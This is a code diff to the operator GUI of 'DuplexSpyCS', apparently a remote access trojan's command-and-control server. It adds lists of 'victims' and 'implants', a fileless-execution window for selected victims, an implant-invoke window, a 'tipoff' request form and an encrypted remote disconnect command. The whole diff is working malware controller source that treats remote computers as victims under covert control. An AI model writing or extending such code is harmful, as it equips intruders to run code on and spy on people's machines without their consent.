@@ -29,6 +29,19 @@ namespace DuplexSpyCS
             InitializeComponent();
         }
 
+        /// <summary>
+        /// Return a list of victim from listview selected items.
+        /// </summary>
+        /// <returns></returns>
+        private List<Victim> fnlsGetSelectedVictims()
+        {
+            List<Victim> lsVictim = new List<Victim>();
+            foreach (ListViewItem item in listView1.SelectedItems)
+                lsVictim.Add(GetVictim(item));
+
+            return lsVictim;
+        }
+
         public List<Victim> GetAllVictim()
         {
             List<Victim> lsVictim = new List<Victim>();
@@ -193,7 +206,10 @@ namespace DuplexSpyCS
                             v.remoteOS = cmd[4];
                             v.ID = online_id;
 
-                            Invoke(new Action(() => listView1.Items.Add(item)));
+                            listView1.Items.Add(item);
+                            ListViewItem k = listView2.FindItemWithText(online_id);
+                            if (k != null)
+                                GetVictim(k).Disconnect();
 
                             MakeNewPortfolio(v);
 
@@ -573,6 +589,19 @@ namespace DuplexSpyCS
 
                             f.File_WgetUpdate(szUrl, szSavePath, code, msg);
                         }
+                    }
+                    else if (cmd[1] == "ts")
+                    {
+                        int nCode = int.Parse(cmd[2]);
+                        string szMsg = Crypto.b64D2Str(cmd[3]);
+
+                        if (nCode == 0)
+                        {
+                            MessageBox.Show(szMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+
+                        f.fileLV_Refresh();
                     }
                 }
 
@@ -1328,6 +1357,42 @@ namespace DuplexSpyCS
             }
         }
 
+        private void fnImplantConnected(Listener l, Victim v, string[] aszMsg)
+        {
+            ListViewItem item = new ListViewItem(aszMsg[0]);
+            item.SubItems.Add(v.socket.RemoteEndPoint.ToString());
+            for (int i = 1; i < aszMsg.Length; i++)
+                item.SubItems.Add(aszMsg[i]);
+            item.Tag = v;
+
+            Invoke(new Action(() =>
+            {
+                if (listView2.FindItemWithText(aszMsg[0]) != null)
+                    return;
+
+                listView2.Items.Add(item);
+            }));
+        }
+
+        private void fnImplantDisconnected(Victim v)
+        {
+            try
+            {
+                Invoke(new Action(() =>
+                {
+                    ListViewItem item = listView2.FindItemWithText(v.ID);
+                    if (item == null)
+                        return;
+
+                    listView2.Items.Remove(item);
+                }));
+            }
+            catch (Exception ex)
+            {
+
+            }
+        }
+
         /// <summary>
         /// Get victim of listviewitem tag.
         /// </summary>
@@ -1376,7 +1441,7 @@ namespace DuplexSpyCS
         }
 
         //Setup DuplexSpyCS Server
-        void setup()
+        void fnSetup()
         {
             //listView1.OwnerDraw = true;
             //ColorStyle(color_style, this);
@@ -1426,6 +1491,9 @@ namespace DuplexSpyCS
             listener.ReceivedDecoded += Received;
             listener.Disconencted += Disconnected; //Disconnected event.
 
+            listener.ImplantConnected += fnImplantConnected;
+            listener.Disconencted += fnImplantDisconnected;
+
             //Display remote desktop
             listView1.SmallImageList = il_screen; //Detail mode.
             listView1.LargeImageList = il_screen; //LargeIcon mode.
@@ -1439,7 +1507,7 @@ namespace DuplexSpyCS
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            setup();
+            fnSetup();
         }
 
         //MANAGER
@@ -1524,7 +1592,12 @@ namespace DuplexSpyCS
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-            Text = $"DuplexSpyCS v1.0.0 by ISSAC | Port[{(listener == null || listener.port == -1 ? string.Empty : listener.port)}] | Online[{listView1.Items.Count}] | Selected [{listView1.SelectedItems.Count}]";
+            Text = $"DuplexSpyCS v1.0.0 by ISSAC | " +
+                $"Port[{(listener == null || listener.port == -1 ? string.Empty : listener.port)}] | " +
+                $"Online[{listView1.Items.Count}] - " +
+                $"Implant[{listView2.Items.Count}] - " +
+                $"Total[{(listView1.Items.Count + listView2.Items.Count)}] | " +
+                $"Selected({tabControl1.SelectedTab.Text}) [{(tabControl1.SelectedIndex == 0 ? listView1.SelectedItems.Count : listView2.SelectedItems.Count)}]";
         }
 
         private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
@@ -1792,6 +1865,7 @@ namespace DuplexSpyCS
             {
                 Victim v = GetVictim(item);
                 frmWMI f = new frmWMI();
+                f.StartPosition = FormStartPosition.CenterScreen;
                 f.Tag = Function.WMI;
                 f.v = v;
                 f.Text = $@"WMI\\{v.ID}";
@@ -2009,6 +2083,49 @@ namespace DuplexSpyCS
         {
             string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[5].Text).ToArray());
             Clipboard.SetText(szText);
+        }
+
+        private void toolStripMenuItem40_Click(object sender, EventArgs e)
+        {
+            List<Victim> lsVictim = fnlsGetSelectedVictims();
+            if (lsVictim.Count == 0)
+                return;
+
+            frmFilelessExec f = new frmFilelessExec();
+            f.m_lsVictim = lsVictim;
+
+            f.Show();
+        }
+
+        private void toolStripButton6_Click(object sender, EventArgs e)
+        {
+            frmTipoff f = new frmTipoff(listener);
+            f.Text = "Tipoff Request";
+            f.Show();
+        }
+
+        //Implant - Invoke
+        private void toolStripMenuItem42_Click(object sender, EventArgs e)
+        {
+            List<Victim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
+            if (lVictim.Count == 0)
+                return;
+
+            frmImplantInvoke f = new frmImplantInvoke(lVictim);
+            f.Show();
+        }
+        //Implant - Disconnect
+        private void toolStripMenuItem43_Click(object sender, EventArgs e)
+        {
+            List<Victim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
+
+            Task.Run(() =>
+            {
+                foreach (Victim v in lVictim)
+                {
+                    v.encSend(0, 0, clsEZData.fnGenerateRandomStr());
+                }
+            });
         }
     }
 }
